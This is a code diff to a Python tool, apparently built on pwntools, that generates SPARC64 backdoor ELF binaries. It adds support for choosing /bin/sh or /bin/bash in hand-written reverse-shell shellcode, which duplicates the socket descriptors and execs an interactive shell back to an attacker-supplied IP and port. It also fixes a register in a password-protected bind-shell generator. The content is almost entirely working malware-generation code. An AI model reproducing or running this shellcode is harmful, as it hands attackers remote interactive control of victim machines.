@@ -13,7 +13,7 @@ from colorama import Fore,Back,Style
 from . import extract_shellcode
 from . import my_package
 
-def sparc64_backdoor(reverse_ip ,reverse_port, filename = None):
+def sparc64_backdoor(shell_path ,reverse_ip ,reverse_port, envp ,filename = None):
     context.arch = 'sparc64'
     context.endian = 'big'
     context.bits = '64'
@@ -70,24 +70,61 @@ def sparc64_backdoor(reverse_ip ,reverse_port, filename = None):
     mov  0x5a, %g1
     ta   0x10
     mov  %l0, %o0
-    mov  2,  %o2
+    mov  2,  %o1
     mov  0x5a, %g1
     ta   0x10
-    sethi  0xbd89a, %g2
-    or     %g2, 0x16e, %g2
-    sethi  %hi(0x2f736800), %g3
-    st     %g2, [%sp + 0x20]
-    st   %g3, [%sp + 0x24]
-    mov  0,  %g3
-    add  %sp, 0x20, %g1
-    mov  %g1, %o0
-    stx   %g1, [%sp]
-    stx   %g3, [%sp +8]
-    mov  %sp, %o1
-    mov  %g3, %o2
-    mov  0x3b, %g1
-    ta   0x10
     '''
+    if shell_path == "/bin/sh" or shell_path == "sh":
+        shellcode += '''
+        sethi  0xbd89a, %g2
+        or     %g2, 0x16e, %g2
+        sethi  %hi(0x2f736800), %g3
+        st     %g2, [%sp + 0x20]
+        st   %g3, [%sp + 0x24]
+        set  0x2d69 , %g2
+        st   %g2, [%sp + 0x28] 
+        mov  0,  %g3
+        add  %sp, 0x20, %g1
+        mov  %g1, %o0
+        stx   %g1, [%sp]
+        add  %sp, 0x2a, %g1
+        stx   %g1,  [%sp +8]
+        stx   %g3, [%sp +16]
+        mov  %sp, %o1
+        mov  %g3, %o2
+        mov  0x3b, %g1
+        ta   0x10
+        '''
+    elif shell_path == "/bin/bash" or shell_path == "bash":
+        shellcode += '''
+        set  0x2F62696E, %g2
+        set  0x2F626173, %g3
+        st   %g2, [%sp + 0x20]
+        st   %g3, [%sp + 0x24]
+        mov  0x68, %g1
+        stb  %g1, [%sp + 0x28]
+        set  0x2d69 , %g2
+        st   %g2, [%sp + 0x30]
+        mov  0,  %g3
+        add  %sp, 0x20, %g1
+        mov  %g1, %o0
+        stx   %g1, [%sp]
+        add  %sp, 0x32, %g1
+        stx   %g1,  [%sp +8]
+        stx   %g3, [%sp +16]
+        mov  %sp, %o1
+        mov  %g3, %o2
+        mov  0x3b, %g1
+        ta   0x10
+        '''
+    else:
+        log.info("now shell is only support sh and bash")
+        return 
+    if(envp == None):
+        envp = 0
+    else:
+        envp = my_package.get_envir_args(envp)
+
     shellcode = asm(shellcode.format(reverse_ip_1, reverse_ip_2, reverse_ip_3, reverse_ip_4, handle_port, handle_port_1))
     ELF_data = make_elf(shellcode)
     if(filename==None):
@@ -210,7 +247,7 @@ def sparc64_bind_shell(bindport, passwd, filename=None):
     mov  0x5a, %g1
     ta   0x10
     mov  %l0, %o0
-    mov  2,  %o2
+    mov  2,  %o1
     mov  0x5a, %g1
     ta   0x10
     set  0x50617373, %g2
